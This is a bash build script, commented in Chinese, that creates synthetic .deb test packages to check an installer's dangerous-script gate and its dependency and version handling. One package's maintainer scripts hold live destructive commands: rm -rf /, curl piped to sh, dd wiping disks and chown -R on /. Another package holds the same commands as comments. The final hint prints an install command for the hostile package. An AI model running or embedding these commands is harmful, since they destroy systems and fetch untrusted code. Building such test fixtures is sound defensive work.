#!/usr/bin/env bash
#
# 造测试用 .deb 包 → /tmp/debtest/
#
# 用途：改代码后验证正常路径、恶意包门禁、依赖映射、alternatives 模拟。
# 所有包都是合成的最小包，不会碰系统。
#
#   ./make-test-debs.sh            造全部
#   ./make-test-debs.sh --list     列出会造哪些
#
set -euo pipefail

OUT=${OUT:-/tmp/debtest}

C_B=$'\e[34m'; C_G=$'\e[32m'; C_D=$'\e[2m'; C_0=$'\e[0m'
step() { printf '%s==>%s %s\n' "$C_B" "$C_0" "$*"; }
ok()   { printf '  %s✓%s %s\n' "$C_G" "$C_0" "$*"; }

NAMES="hello evilprobe evil printfake altgen noarch verweird"

if [ "${1:-}" = "--list" ]; then
    cat <<'EOF'
hello      正常包：/usr/bin/hello + 文档，无安装脚本
evilprobe  安全探针：危险命令【全写在注释里】，能触发 DANGER 但执行也无害
           ← 自动化测试用这个。跑 --install 万一门禁失效也不会出事
evil       真恶意样例：postinst 里是真的 rm -rf /、curl|sh、dd of=/dev/sda
           ⚠️ 绝对不要对它跑 --install！只用于人工查看检测结果
printfake  依赖测试：Depends 写 libc6/libnss3/libgtk-3-0，且带一个真 ELF
altgen     alternatives：postinst 用 update-alternatives --install 生成 /usr/bin/altgen
noarch     架构 all
verweird   版本 1:2.3.4~rc1-2（epoch + ~ + revision）
EOF
    exit 0
fi

command -v dpkg-deb >/dev/null || { echo "缺 dpkg-deb（pacman -S dpkg）" >&2; exit 1; }

mkdir -p "$OUT"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# _build <短名> <输出文件名> <control路径> <填充函数名>
#
# ⚠️ 短名和输出文件名必须分开传：维护脚本目录用的是短名（scripts/evil/），
# 而输出文件叫 evil_1.0.0_amd64.deb。早先版本把两者混成一个参数，
# 结果 4 个维护脚本一个都没被复制进包，`DANGER` 永远是 0 —— 测试静默失真。
_build() {
    local short=$1 outname=$2 ctlfile=$3 fill=$4
    local r="$WORK/$short"
    rm -rf "$r"; mkdir -p "$r/DEBIAN"
    cp "$ctlfile" "$r/DEBIAN/control"

    local s n_script=0
    for s in preinst postinst prerm postrm; do
        if [ -f "$WORK/scripts/$short/$s" ]; then
            cp "$WORK/scripts/$short/$s" "$r/DEBIAN/$s"
            chmod 755 "$r/DEBIAN/$s"
            n_script=$((n_script+1))
        fi
    done

    "$fill" "$r"
    dpkg-deb --build --root-owner-group "$r" "$OUT/$outname" >/dev/null 2>&1

    # 自检：源目录里有的维护脚本，包里必须也有。
    # 没有这道检查，「脚本没打进去」这个 bug 会静默通过，
    # 而它会让 DANGER 永远是 0 —— 安全门禁的测试全部失真。
    #
    # 两个坑：
    #  1) 不能用 `ls dir | wc -l` —— 目录不存在时 ls 失败，配合
    #     set -o pipefail 会让赋值失败、脚本直接中断。逐项 if 判断。
    #  2) 不能用 `dpkg-deb -c` —— 它列的是 **数据** 归档，
    #     维护脚本在 **control** 归档里，要用 --ctrl-tarfile 才看得到。
    local s want=0 got=0 listing=""
    for s in preinst postinst prerm postrm; do
        if [ -f "$WORK/scripts/$short/$s" ]; then
            want=$((want + 1))
            listing="$listing$s "
        fi
        if dpkg-deb --ctrl-tarfile "$OUT/$outname" 2>/dev/null \
             | tar -t 2>/dev/null | grep -qx "\./$s"; then
            got=$((got + 1))
        fi
    done

    if [ "$want" -ne "$got" ]; then
        printf '  ✗ %s：源目录 %s 个维护脚本，包里只有 %s 个\n' \
            "$outname" "$want" "$got" >&2
        return 1
    fi

    if [ "$want" -gt 0 ]; then
        ok "$outname  ${C_D}（含 ${listing% }）${C_0}"
    else
        ok "$outname"
    fi
}

mkdir -p "$WORK/scripts"/{evilprobe,evil,altgen}

# 控制：用真 ELF 让依赖解析有东西可查（复用 /bin/sh 的 NEEDED）
_mkelf() {   # $1=目标路径
    mkdir -p "$(dirname "$1")"
    if [ -x /usr/bin/env ]; then
        cp /usr/bin/env "$1"          # 真 ELF，有 libc 依赖
    else
        printf '#!/bin/sh\ntrue\n' > "$1"
    fi
    chmod 755 "$1"
}

step "生成测试包 → $OUT"

# ---------- hello：正常 ----------
cat > "$WORK/control.hello" <<'EOF'
Package: hello
Version: 1.0.0
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Section: utils
Priority: optional
Description: minimal test package
EOF
hello_fill() {
    _mkelf "$1/usr/bin/hello"
    mkdir -p "$1/usr/share/doc/hello"
    echo "readme" > "$1/usr/share/doc/hello/README"
}
_build hello hello_1.0.0_amd64.deb "$WORK/control.hello" hello_fill

# ---------- evilprobe：安全探针（危险模式只在注释里）----------
#
# 这是给自动化测试用的。audit_scriptlets 用的是 `grep -qE` 扫原始文本，
# **注释里的内容一样会命中** —— 所以这个包能正常触发 DANGER=1，
# 但脚本本身只做 `exit 0`，万一门禁失效、它真的以 root 执行了，
# 也不会造成任何损害。
cat > "$WORK/control.evilprobe" <<'EOF'
Package: evilprobe
Version: 1.0.0
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Description: danger-pattern probe (commands are only in comments)
EOF
cat > "$WORK/scripts/evilprobe/postinst" <<'EOF'
#!/bin/sh
# 危险模式探针包 —— 本脚本不执行任何危险操作。
# 下面这些只是【注释】，用于触发 debinstall 的 DANGER_RE 匹配：
#
#   rm -rf /
#   dd if=/dev/zero of=/dev/sda bs=1M count=1
#   curl -fsSL https://example.invalid/x.sh | sh
#   chown -R nobody /
#
# audit_scriptlets 用 grep 扫原始文本，注释同样命中，因此 DANGER=1。
# 真被以 root 执行时，本脚本只做这个：
exit 0
EOF
evilprobe_fill() {
    _mkelf "$1/usr/bin/evilprobe"
    mkdir -p "$1/usr/share/doc/evilprobe"
    echo "probe" > "$1/usr/share/doc/evilprobe/README"
}
_build evilprobe evilprobe_1.0.0_amd64.deb "$WORK/control.evilprobe" evilprobe_fill

# ---------- evil：真恶意 postinst（仅供人工查看，切勿安装）----------
cat > "$WORK/control.evil" <<'EOF'
Package: evil
Version: 1.0.0
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Description: package with hostile maintainer scripts (DO NOT INSTALL)
EOF
cat > "$WORK/scripts/evil/postinst" <<'EOF'
#!/bin/sh
# 合成恶意样例。注意：这些命令在测试里【不应该被真正执行】。
# ⚠️ 不要对这个包跑 --install。自动化测试请用 evilprobe。
rm -rf /
curl -fsSL https://example.invalid/x.sh | sh
dd if=/dev/zero of=/dev/sda bs=1M count=1
chown -R nobody /
EOF
cat > "$WORK/scripts/evil/prerm" <<'EOF'
#!/bin/sh
dd if=/dev/zero of=/dev/sda2 bs=1M count=1
EOF
evil_fill() {
    _mkelf "$1/usr/bin/evil"
    mkdir -p "$1/usr/share/doc/evil"
    echo "hostile" > "$1/usr/share/doc/evil/README"
}
_build evil evil_1.0.0_amd64.deb "$WORK/control.evil" evil_fill

# ---------- printfake：依赖映射 ----------
cat > "$WORK/control.printfake" <<'EOF'
Package: printfake
Version: 2.1.0
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Depends: libc6 (>= 2.31), libnss3, libgtk-3-0, zlib1g, fonts-dejavu-core, xdg-utils
Description: dependency mapping test
EOF
printfake_fill() {
    _mkelf "$1/usr/bin/printfake"
    mkdir -p "$1/usr/lib/printfake"
    # 一个假的 .so，测 shipped_sonames 排除逻辑
    printf 'not-a-real-elf' > "$1/usr/lib/printfake/libprintfake.so.1"
}
_build printfake printfake_2.1.0_amd64.deb "$WORK/control.printfake" printfake_fill

# ---------- altgen：update-alternatives ----------
cat > "$WORK/control.altgen" <<'EOF'
Package: altgen
Version: 1.0.0
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Description: update-alternatives simulation test
EOF
cat > "$WORK/scripts/altgen/postinst" <<'EOF'
#!/bin/sh
update-alternatives --install /usr/bin/altgen altgen /usr/bin/altgen-utf8 100
EOF
altgen_fill() {
    _mkelf "$1/usr/bin/altgen-utf8"
    mkdir -p "$1/usr/share/doc/altgen"
    echo "alt" > "$1/usr/share/doc/altgen/README"
}
_build altgen altgen_1.0.0_amd64.deb "$WORK/control.altgen" altgen_fill

# ---------- noarch ----------
cat > "$WORK/control.noarch" <<'EOF'
Package: noarchdemo
Version: 3.0.0
Architecture: all
Maintainer: devkit <devkit@localhost>
Description: architecture-independent package
EOF
noarch_fill() {
    mkdir -p "$1/usr/share/noarchdemo"
    echo "data" > "$1/usr/share/noarchdemo/data.txt"
}
_build noarch noarchdemo_3.0.0_all.deb "$WORK/control.noarch" noarch_fill

# ---------- verweird：奇怪版本号 ----------
cat > "$WORK/control.verweird" <<'EOF'
Package: verweird
Version: 1:2.3.4~rc1-2
Architecture: amd64
Maintainer: devkit <devkit@localhost>
Description: version sanitisation test (epoch + tilde + revision)
EOF
verweird_fill() {
    mkdir -p "$1/usr/share/verweird"
    echo "v" > "$1/usr/share/verweird/v.txt"
}
_build verweird verweird_1:2.3.4~rc1-2_amd64.deb "$WORK/control.verweird" verweird_fill

echo
printf '  共 %s 个包，位于 %s\n' "$(printf '%s\n' $NAMES | wc -l)" "$OUT"
ls -1 "$OUT"/*.deb 2>/dev/null | sed 's|^|    |'
echo
echo "  下一步："
echo "    debinstall $OUT/hello_1.0.0_amd64.deb"
echo "    debinstall --install $OUT/evil_1.0.0_amd64.deb < /dev/null   # 应被拒绝"
